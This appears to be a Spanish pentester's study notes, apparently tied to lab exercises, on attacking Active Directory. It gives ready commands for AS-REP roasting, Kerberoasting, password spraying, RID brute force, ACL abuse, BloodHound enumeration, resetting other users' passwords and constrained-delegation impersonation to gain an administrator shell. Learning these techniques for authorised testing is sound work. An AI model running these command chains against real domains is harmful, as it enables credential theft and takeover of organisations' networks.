Si tenemos una lista de usuarios, podemos probar a hacer este ataque. 

Ataque que va probando usuario por usuario, para detectar el que no tiene activada la autenticación de kerberos. Y si hay alguno, luego con el hash podemos intentar crackearlo en local.

Para el ataque de ASREProast:

```
impacket-GetNPUsers <dominio>/ -no-pass -usersfile <wordlistUsers>
```

Otra forma para probar con una lista de users válidos, probar si son ASP-Rep:

```
GetNPUsers.py -request -format john -usersfile valid_usernames.txt <dominio>/
```

Si en la salida vemos un user con muchos dígitos al lado, significa que hay un usuario que es vulnerable a este ataque. En este caso el user 'suport' y tenemos su hash.

Para crackear el hash:

```
john --wordlist=<wordlist> <ficheroHash>
```

Y si funciona tenemos su contraseña.

Podemos validar si es correcta con:

```
crackmapexec smb <IP> -u <user> -p <contraseña>
```

Podemos enumerar recursos compartidos, pero ya de forma autenticada:

```
smbmap -H <IP> -u <user> -p <contraseña>
```

Si tenemos credenciales podemos intentar acceder a la máquina de forma remota:

```
evil-winrm -i <IP> -u <user> -p <contraseña>
```

Si funciona se nos abre una shell y podemos ejecutar comandos. Y después ya ver cómo escalar privilegios. A veces no funciona evil-winrm, si ese usuario no tiene permiso de acceso de forma remota. Si tenemos credenciales, pero no podemos acceder, podemos usar Bloodhound para enumerar el AD.


2. **Kerberoasting**

Cuando tenemos usuario y contraseña de un entorno de AD, podemos hacer un ataque de kerberoasting.

Es una técnica común tras la explotación (postexplotación) para permitir a los atacantes obtener acceso privilegiado al AD (escalar privilegios).

El atacante explota el Servicio de Concesión de Tickets (TGS) de Kerberos para solicitar una contraseña cifrada y, posteriormente, la descifra sin conexión mediante diversas técnicas de fuerza bruta. Estos ataques son difíciles de detectar, ya que la solicitud se realiza a través de un usuario autorizado y no se genera ningún patrón de tráfico inusual durante este proceso. Puede prevenir el ataque garantizando una capa adicional de autenticación mediante MFA o restableciendo la contraseña de la cuenta de servicio del Centro de Distribución de Claves (KDC) de Kerberos de forma frecuente y periódica.

Con este ataque de forma autenticada podemos obtener el ticket del usuario administrador:

```
impacket-GetUsersSPNs <dominio>/<usuario>:<contraseña> -request
```

Con esto obtendríamos el Ticket Granting Service (TGS), que es el hash del usuario administrador. 

Lo copiamos y crackeamos con john. 

Si funciona, ahora probamos con evil-winrm y otras herramientas. Por ejemplo:

```
impacket-psexec <dominio>/<ususarioAdmin>:<contraseña>@<IP> cmd.exe
```

Otras formas para buscar qué users son kerberoastables:

```
.\Rubeus.exe kerberoast /user:<user> /domain:<domain> /outfile:<hashes.txt>
```


3. **Protocolo de Escritorio Remoto (RDP) por fuerza bruta**

Los intrusos o atacantes utilizan herramientas de escaneo para forzar las credenciales vulnerables. Una vez que la fuerza bruta tiene éxito, acceden rápidamente a los sistemas comprometidos e intentan realizar una escalada de privilegios junto con un punto de apoyo persistente en la computadora del objetivo. La mejor recomendación es nunca exponer RDP sin controles de seguridad adicionales a Internet público. 


4. **Recursos compartidos de acceso público**

Durante la configuración de AD, algunas carpetas compartidas son de acceso público o no se autentican, lo que proporciona una vía de acceso inicial para ataques laterales. Puede usar el cmdlet `Get-SmbOpenFile` en PowerShell para buscar recursos compartidos no deseados en la red y configurar el acceso según corresponda.


5. **Inyección de credenciales**

La herramienta **Runas** es útil si hemos encontrado **credenciales de AD y no sabemos dónde iniciar sesión**.

En las evaluaciones de seguridad, a menudo tendrás acceso a la red y acabas de descubrir credenciales de AD, pero no tienes los medios ni los privilegios para crear una nueva máquina unida al dominio. Por lo tanto, necesitamos poder usar esas credenciales en una máquina Windows que controlemos.

Si tenemos las credenciales de AD en el formato `<nombre de usuario>:<contraseña>`, podemos usar Runas, un binario legítimo de Windows, para inyectarlas en la memoria. El comando Runas habitual sería similar a esto:

```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

- **/netonly** - Como no estamos unidos a un dominio, queremos cargar las credenciales para la autenticación de red, pero no para la autenticación con un controlador de dominio. Por lo tanto, los comandos ejecutados localmente en el equipo se ejecutarán en el contexto de su cuenta estándar de Windows, pero cualquier conexión de red se realizará utilizando la cuenta especificada aquí.
- **/user** - Aquí, proporcionamos los detalles del dominio y el nombre de usuario. Siempre es recomendable usar el nombre de dominio completo (FQDN) en lugar del nombre NetBIOS del dominio, ya que esto facilitará la resolución.
- **cmd.exe** - Este es el programa que queremos ejecutar una vez que se hayan inyectado las credenciales. Puede cambiarse por cualquier valor, pero la opción más segura es cmd.exe, ya que puede usarlo para iniciar cualquier aplicación con las credenciales inyectadas.

Una vez ejecutado este comando, se le solicitará una contraseña. Tenga en cuenta que, dado que añadimos el parámetro /netonly, las credenciales no serán verificadas directamente por un controlador de dominio para que acepte cualquier contraseña. Aún necesitamos confirmar que las credenciales de red se hayan cargado correctamente.

**Nota:** Si usa su propio equipo Windows, asegúrese de ejecutar el primer símbolo del sistema como administrador. Esto inyectará un token de administrador en CMD. Si ejecuta herramientas que requieren privilegios de administrador local desde su CMD generado por Runas, el token ya estará disponible. Esto no le otorga privilegios de administrador en la red, pero garantiza que cualquier comando local que ejecute se ejecute con privilegios de administrador.


6. **Password spraying**

Es una técnica de ataque en la que se **prueba un pequeño conjunto de contraseñas comunes en muchas cuentas**. A diferencia de los ataques de fuerza bruta, este ataque evita el bloqueo de cuentas al probar cada cuenta con solo unos pocos intentos, aprovechando las malas prácticas de contraseñas comunes en muchas organizaciones. 

```shell-session
user@t$ crackmapexec smb <IP> -u <users.txt> -p <passwords.txt>
```

El símbolo `[+]` en la línea de salida indica que hemos encontrado un par de credenciales válido.

7. Fuerza bruta para descubrir nombres de usuario (RID bruteforce)

```
crackmapexec smb <dominio> -u '<user>' -p '<pass>' --rid-brute 1500
```

Ejemplo si podemos listar de forma anónima:

```
crackmapexec smb haystack.thm.corp -u 'anonymous' -p '' --rid-brute 1500
```

Para crear la lista de usuarios válidos:

```
crackmapexec smb <dominio> -u 'anonymous' -p '' --rid-brute 1500 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > valid_usernames.txt
```


8. Credenciales de inicio de sesión automático.


# Explotación de ACEs

## Delegación de permisos y ACL

Las vulnerabilidades de delegación de permisos suelen denominarse ataques basados en ACL. AD permite a los administradores configurar **entradas de control de acceso (ACE)** que rellenan las **listas de control de acceso discrecional (DACL)**, de ahí el nombre de ataques basados en ACL. 

Casi cualquier **objeto AD puede protegerse con ACE, que describen los permisos permitidos y denegados que cualquier otro objeto AD tiene sobre el objeto de destino**.

Sin embargo, si estas ACE están mal configuradas, es posible que un atacante las aproveche. 

Ej: Si al equipo de soporte de TI se le concediera la ACE ForceChangePassword sobre el grupo de usuarios del dominio, esto se consideraría inseguro. Por supuesto, podrían restablecer las contraseñas de los empleados que las hubieran olvidado, pero esta configuración incorrecta les permitiría también restablecer las contraseñas de cuentas con privilegios, como las cuentas que son miembros del grupo de administradores del dominio, lo que esencialmente permitiría una escalada de privilegios.

Aprovechamiento de ACE

- **ForceChangePassword:** Tenemos la capacidad de establecer la contraseña actual del usuario sin conocer su contraseña actual.
- **AddMembers:** Tenemos la capacidad de añadir usuarios (incluida nuestra propia cuenta), grupos u ordenadores al grupo de destino.
- **GenericAll:** Tenemos control total sobre el objeto, incluida la capacidad de cambiar la contraseña del usuario, registrar un SPN o añadir un objeto AD al grupo de destino.
- **GenericWrite:** Podemos actualizar cualquier parámetro no protegido de nuestro objeto de destino. Esto nos permitiría, por ejemplo, actualizar el parámetro scriptPath, lo que provocaría que se ejecutara un script la próxima vez que el usuario iniciara sesión.
- **WriteOwner:** Tenemos la capacidad de actualizar el propietario del objeto de destino. Podríamos convertirnos en el propietario, lo que nos permitiría obtener permisos adicionales sobre el objeto.
- **WriteDACL:** Tenemos la capacidad de escribir nuevos ACE en el DACL del objeto de destino. Podríamos, por ejemplo, escribir un ACE que otorgue a nuestra cuenta control total sobre el objeto de destino.
- **AllExtendedRights:** Tenemos la capacidad de realizar cualquier acción asociada con los derechos extendidos de AD sobre el objeto de destino. Esto incluye, por ejemplo, la capacidad de forzar el cambio de la contraseña de un usuario.




# Instalar Bloodhound

1. Instalar Bloodhound y Neo4j

```
sudo apt install bloodhound neo4j
```

2. Iniciamos la base de datos:

```
sudo neo4j console
```

En la salida ver qué puerto ha usado para levantar el servicio y acceder a él con el navegador.

3. Acceder al servicio en el navegador.
4. Poner neo4j:neo4j y pulsar en 'connect'.
5. Poner la nueva contraseña y dar a 'change password'. Y así el user será neo4j y la contraseña que elijamos.
6. Bajarse bloodhound desde github. https://github.com/dirkjanm/BloodHound.py
7. Si tengo usuario con contraseña puedo acceder a mucha información del AD.
8. Clonar el repositorio

```
git clone https://github.com/dirkjanm/BloodHound.py.git
```

7. Acceder al AD:

```
python3 bloodhound.py -u <user> -p <contraseña> -ns <IP> -d <dominio> -c all
```

Esto sacará muchos archivos del AD y eso lo cargaremos dentro del programa bloodhound.

Para importar los resultados, deberás recuperar el archivo ZIP del host de Windows. La forma más sencilla es usar el comando SCP en tu AttackBox:

`scp <AD Username>@<dominio>:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .`

8. Si lo queremos ver de forma gráfica, ahora abrimos la app de bloodhound.
9. Ponemos el user y la contraseña elegida y pulsamos en 'login'.
10. Aparece vacío porque no hay nada cargado. Pulsamos en 'upload data', nos vamos a la carpeta del bloodhound.py y cargamos todos los ficheros '.json'.
11. Ahora en el campo de búsqueda podemos poner el nombre del usuario comprometido. Marcar 'mark user as owned' para saber que le tenemos.
12. Si le damos en las líneas de al lado de la búsqueda, vemos más información. La pestaña de análisis es la más importante para ir enumerando.

No es la única forma de instalarlo.


# Mejor vía para analizar AD

Entendiendo que ya se cuenta con un user dentro del AD y se quiere pivotar o escalar privilegios.

Descargo en kali (atacante) SharpHound.exe y se lo paso a la víctima.

En víctima lo ejecuto:

```
.\SharpHound.exe /all
```

Ahora paso el ZIP que se genera, al atacante.

Inicio la app bloodhound en Kali y abro ese zip.

El objetivo suele ser conseguir ser Domain admin dentro del AD.


# Analizar resultados en Bloodhound

Podemos observar que se devuelve una cantidad significativa de información. Cada categoría proporciona la siguiente información:

- **Resumen**: Proporciona información resumida, como el número de sesiones activas de la cuenta y si puede alcanzar objetivos de alto valor.
- **Propiedades del nodo**: Muestra información sobre la cuenta de AD, como el nombre para mostrar y el título.
- **Propiedades adicionales**: Proporciona información más detallada de AD, como el nombre distintivo y la fecha de creación de la cuenta.
- **Membresía de grupo**: Muestra información sobre los grupos a los que pertenece la cuenta.
- **Derechos de administrador local**: Proporciona información sobre los hosts unidos al dominio donde la cuenta tiene privilegios administrativos.
- **Derechos de ejecución**: Proporciona información sobre privilegios especiales, como la capacidad de acceder a una máquina mediante RDP.
- **Derechos de control de salida**: Muestra información sobre los objetos de AD cuyos atributos esta cuenta tiene permiso para modificar.
- **Derechos de control de entrada**: Proporciona información sobre los objetos de AD que pueden modificar los atributos de esta cuenta.

Los iconos se llaman nodos y las líneas, bordes. Si queremos formular una ruta de ataque, debemos observar los bordes disponibles entre la posición actual, los privilegios que tenemos y el destino al que queremos llegar. Bloodhound tiene varios bordes disponibles a los que se puede acceder mediante el icono de filtro.


# Posible vulnerabilidad: Cambiar contraseña a otro usuario (habilitado)

Si en la pestaña de 'node info' dentro de Bloodhound, tenemos el 'outbound object control' y si sale una línea que une a otro usuario y pone que puede cambiar la contraseña a otro usuario, entonces puedo cambiarle la contraseña y hacer pivoting a ese usuario.

Una forma para cambiar la contraseña de un usuario, autenticándose con las credenciales de otro:

```
net rpc password <usuarioAcambiarPass> -U <userQueTengo> -S <IP>
```

Y poner la contraseña nueva del usuario y después la del usuario que tengo.

Otra forma: cambiar la contraseña del usuario con powershell:

```
PS C:\Users\creanyx0> Set-ADAccountPassword <user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
```

Como no queremos que el usuario al que le hemos cambiado la contraseña siga usando una contraseña que conocemos, también podemos forzar el restablecimiento de la contraseña en el próximo inicio de sesión con el siguiente comando:

```
PS C:\Users\creanyx0> Set-ADUser -ChangePasswordAtLogon $true -Identity <user> -Verbose
```

Probar que se ha cambiado bien:

```
crackmapexec smb <dominio> -u '<user>' -p '<contraseña>'
```

Y ahora puedo listar recursos compartidos con el nuevo usuario:

```
smbmap -H <IP> -u <usuarioQueHemoscambiadoPass> -p <contraseña>
```


# Posible vulnerabilidad: Delegated control

El proceso de otorgar privilegios a un usuario sobre alguna OU u otro objeto de AD se denomina control delegado. Por ejemplo, podemos cambiar los privilegios.


# Posible vulnerabilidad: constrained delegation

Si un usuario puede realizar constrained delegation, significa que podemos suplantar la identidad del administrador del CIFS servicio en el controlador de dominio.

```
getST.py -spn "cifs/<dominio>" -impersonate "Administrator" "<dominio>/<user>:<pass>"
```

De esta forma estás pidiendo un service ticket (ST) para el servicio CIFS en el dominio dado. - Básicamente: "Dame un ticket Kerberos para acceder a SMB de esa máquina". En este caso, generas un ticket como si fueses admin, con las credenciales de una cuenta con permisos para solicitar ese ticket.

Y ahora para conseguir una shell:

Configuramos la ccache mediante la KRB5CCNAME variable de entorno:

```
export KRB5CCNAME=Administrator.ccache
```

Ahora podemos usar wmi la autenticación Kerberos para obtener un shell con admin:

```
wmiexec.py -k -no-pass Administrator@<dominio>
```




